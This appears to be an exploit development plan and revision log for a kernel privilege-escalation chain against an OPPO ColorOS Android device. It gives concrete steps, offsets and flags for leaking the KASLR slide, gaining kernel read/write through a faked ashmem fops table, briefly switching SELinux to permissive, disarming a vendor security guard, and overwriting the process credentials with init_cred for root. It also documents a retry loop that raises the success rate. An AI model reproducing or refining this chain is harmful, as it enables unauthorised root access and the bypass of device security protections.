## Why this plan wins where the Z-series stopped

Z49's blocker: "need hook off + cred in two walks; missing primitive = 8-byte
kernel read of swapper_pg_dir". The staged swap R/W provides **unlimited**
8-byte reads AND writes through a plain fd — no walk constraints, no rb_node
VALUE constraints (kwrite writes arbitrary bytes, so the Z-series "VALUE must
be a mapped zero page" rule no longer applies), no walk budget, no spray.

## The path (one ALIVE swap window, ~60 s inside it)

**Stage 1 — get the window (proven, ~25%/cycle-pair, ~4 min per fire):**
1. O-fire: `MODE4_SLIDE=1` → boot_id becomes oracle output (`661f…-…ff-ffff-e0a8-8d2a80ffffff`)
2. Verify uptime continuity (adb blips fake SOFTBOOT), decode slide
3. N-fire: `MODE4_SLIDE_SWAP=1 KASLR_SLIDE=<slide> MODE4_SWAP_NOCFI=1` → parse
   `fake_fops (ffffff…0100)` from the stamp line → CLASS ALIVE = window open

**Stage 2 — inside the window (swap_probe v3, all syscall-level):**
```
 a. kwrite test (page scratch)                    → primitive confirmed
 b. llseek repair (slid noop_llseek → +0x08)      → death clock stopped
 c. PARK 1 byte: kwrite(P0(selinux_state)+1, 0)   → permissive (perf unlocked)
 d. in-process modip harvest (type=8, 3M getpid)  → hook page → g_boot VA
 e. PTE walk (all kread 8B):
      pgd = kread(P0(swapper_pg_dir) + 389*8 …)   → entry & 0xFFFFFFFFF000
      pmd = kread(P0(phys1) + pmd_idx*8)          → (handle 2MB block: bit1)
      pte = kread(P0(phys2) + pte_idx*8)          → page phys
      gboot_P0 = 0xffffff8000000000 + phys − 0x80000000
 f. DISARM GUARD: kwrite(gboot_P0, 1 byte = 1)    → no more uid-drop SIGKILL
 g. UNPARK 1 byte: kwrite(P0(selinux_state)+1, 1) → enforcing back (ColorOS window closed)
 h. task self-find (no BTF needed):
      prctl(PR_SET_NAME, "GLRW01")
      tasks_off derived at runtime: init_task.tasks.next → for off in
      0x400..0x600 step 8 read (next−off)+0x790 as comm; printable + 3-node
      walk with sane pid@0x5C8 = validated offset
      walk list, match comm "GLRW01" → our task_struct
 i. ROOT: kwrite(task+0x778, init_cred_P0) and kwrite(task+0x780, init_cred_P0)
 j. getuid()==0 → capture proof → optional harvest
 k. CLEANUP: kwrite(P0(miscdevice.fops) = slid &ashmem_fops = 0xffffffc008000000
    + slide + 0x22BFDC8) → device returns to normal; root cred persists
```

Order matters: guard off (f) BEFORE cred (i); park (c) only as long as the
harvest needs (seconds); unpark (g) before cred so ColorOS never sees
permissive+root at once.

## Fallbacks

- **Stage 2d fails (perf still denied / no hook page):** perf also runs fine in
  a child; retry once. If still dead: skip guard-disarm is NOT an option
  (cred alone = SIGKILL); instead park persists and fall back to Z-series
  single-punch (walk 2) for g_boot — last resort, costs the window.
- **PTE walk hits invalid entry:** module mappings never disappear
  (oplus_security_guard is never unloaded); invalid entry = wrong hook page →
  redo harvest, do not write.
- **tasks_off scan fails:** try parent/child comm variants ("GLRW01" set in
  both), widen scan 0x300..0x700.
- **Window dies early (system write() on ashmem hits the cfg JT):** re-roll
  Stage 1. N3/N5 suggest minutes of stability after llseek repair.
- **ColorOS 15s dialog appears anyway:** kernel-level win stands; proof
  captured before reboot; next iteration unparks faster.

## REV 2026-08-30 #2 — THE FIX (research session, reference: yijiacloud/GhostLock-OPPO-PCKM00)

**Root cause of the 1-in-5 landing (finally identified):** our
`do_pselect_fake_lock_route` custom-write branch set `route_verified = 1`
unconditionally after the FIRST attempt with a route signal — the loop never
retried. The PCKM00 reference reaches ~97% by re-stamping the SAME dangling
waiter up to 24 times (one pselect + one sched_setattr punch per attempt,
rotating delays 10–150ms, per-attempt verification via try_cfi_stage). Our
measured ~15-20% per-attempt × 24 = their 97%. It was never a geometry
problem — it was a missing retry loop.

**Implemented (device binary built, 218304 bytes):**
- `MODE4_SLIDE_CRED` punches: per-attempt landing check via the child's
  CapEff (`uid0_child_capeff_landed()`), retry to
  `LANDING_RETRY_ATTEMPTS` (default 12), no re-spray between attempts
  (same BSS overlay re-stamped).
- `MODE4_SLIDE` oracle: same landing-checked retry via
  `bootid_changed()` (per-attempt boot_id read).
- PCKM00 repo cloned at `../ghostlock-pckm00` for reference.

**QEMU rig findings (this session):** launcher env needed `QEMU_INIT=1`
(the EXPLOIT mounts /proc/sysfs itself — launcher mounts always -22) and
`PSELECT_SHIFT=0`. With those, stamps place cleanly, but the SLIDE-family
walk deterministically panics at `rt_mutex_adjust_prio_chain+0x188` in QEMU
(2-core timing or phys-alias delta). Old QEMU sessions only validated the
STATIC_CHAIN/fops-swap family — SLIDE was never QEMU-proven. Parked as a
rig limitation; the device remains the SLIDE test bench.

**Next device fire:** push the 218304 binary (md5-verify), fire
`hfire.sh` — watch for `cred punch miss attempt=N` /
`CRED LANDED attempt=N` / `oracle store miss attempt=N` lines. If attempt
2+ still shows calls≥1, the re-arm works and the landing lottery is now
~1-(4/5)^12 ≈ 93% per fire.
